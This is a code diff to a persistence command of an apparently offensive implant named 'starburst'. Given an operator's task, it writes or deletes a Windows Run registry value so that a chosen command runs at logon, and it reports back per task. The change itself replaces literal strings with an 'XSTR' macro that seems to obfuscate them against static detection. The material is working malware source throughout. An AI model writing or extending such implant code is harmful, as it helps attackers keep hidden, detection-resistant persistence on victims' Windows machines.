@@ -27,7 +27,7 @@ auto declfn starburst::cmd_persist_run(
 
     if ( !action_str || action_len == 0 || !name_str || name_len == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "need action and name" ) ) );
+            XSTR( "need action and name" ) );
         return;
     }
 
@@ -42,16 +42,15 @@ auto declfn starburst::cmd_persist_run(
     HKEY hive = hkcu ? HKEY_CURRENT_USER : HKEY_LOCAL_MACHINE;
 
     char run_key[64] = { 0 };
-    str_copy( run_key, symbol<char*>( const_cast<char*>(
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ) ) );
+    str_copy( run_key, XSTR("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") );
 
     bool is_install = str_cmp( action_buf,
-        symbol<char*>( const_cast<char*>( "install" ) ) ) == 0;
+        XSTR( "install" ) ) == 0;
 
     if ( is_install ) {
         if ( !command_str || command_len == 0 ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "install requires command" ) ) );
+                XSTR( "install requires command" ) );
             return;
         }
 
@@ -60,7 +59,7 @@ auto declfn starburst::cmd_persist_run(
             hive, run_key, 0, KEY_SET_VALUE, &h_key );
         if ( status != ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
+                XSTR( "RegOpenKeyExA failed" ) );
             return;
         }
 
@@ -72,14 +71,13 @@ auto declfn starburst::cmd_persist_run(
 
         if ( status == ERROR_SUCCESS ) {
             char out[320] = { 0 };
-            str_copy( out, symbol<char*>( const_cast<char*>(
-                "Installed run key: " ) ) );
+            str_copy( out, XSTR("Installed run key: ") );
             uint32_t off = str_len( out );
             memory::copy( out + off, name_buf, str_len( name_buf ) );
             queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegSetValueExA failed" ) ) );
+                XSTR( "RegSetValueExA failed" ) );
         }
     } else {
         // remove
@@ -88,7 +86,7 @@ auto declfn starburst::cmd_persist_run(
             hive, run_key, 0, KEY_SET_VALUE, &h_key );
         if ( status != ERROR_SUCCESS ) {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegOpenKeyExA failed" ) ) );
+                XSTR( "RegOpenKeyExA failed" ) );
             return;
         }
 
@@ -99,7 +97,7 @@ auto declfn starburst::cmd_persist_run(
         if ( !pRegDeleteValueA ) {
             inst.advapi32.RegCloseKey( h_key );
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteValueA not found" ) ) );
+                XSTR( "RegDeleteValueA not found" ) );
             return;
         }
 
@@ -108,14 +106,13 @@ auto declfn starburst::cmd_persist_run(
 
         if ( status == ERROR_SUCCESS ) {
             char out[320] = { 0 };
-            str_copy( out, symbol<char*>( const_cast<char*>(
-                "Removed run key: " ) ) );
+            str_copy( out, XSTR("Removed run key: ") );
             uint32_t off = str_len( out );
             memory::copy( out + off, name_buf, str_len( name_buf ) );
             queue_response( inst, task_uuid, RESPONSE_SUCCESS, out );
         } else {
             queue_response( inst, task_uuid, RESPONSE_ERROR,
-                symbol<char*>( const_cast<char*>( "RegDeleteValueA failed" ) ) );
+                XSTR( "RegDeleteValueA failed" ) );
         }
     }
 }
